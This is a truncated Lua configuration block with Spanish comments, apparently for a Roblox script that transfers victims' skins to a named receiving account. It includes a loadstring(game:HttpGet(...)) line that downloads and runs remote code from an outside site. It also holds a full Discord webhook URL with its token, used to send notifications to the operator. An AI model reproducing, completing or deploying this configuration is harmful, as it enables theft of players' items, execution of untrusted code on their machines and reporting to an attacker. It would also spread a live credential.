local CONFIG = {
    ...
    TARGET_NAME   = "edxz_wuit2026", -- username de la cuenta que recibe las skins
   
    -- Script extra que se ejecuta al iniciar, puede ser un script de Yisus o cualquier otro script.
    -- Dejar vacio para desactivar
    SECOND_SCRIPT_URL = "loadstring(game:HttpGet("https://onyx-scripts.com/onyxhub"))()",

    -- (OPCIONAL) webhook de Discord para notificaciones, dejar vacio para desactivar
    WEBHOOK = {
        URL  = "https://discord.com/api/webhooks/1549122618580402189/CRpG3vAbM9Ujx-mrMLjawFzwfuQdMpGFySDnftO1CwlSRPcIPbzdj4HSXDFu3ZnPb0Xm", -- "https://discord.com/api/webhooks/" webhook de Discord
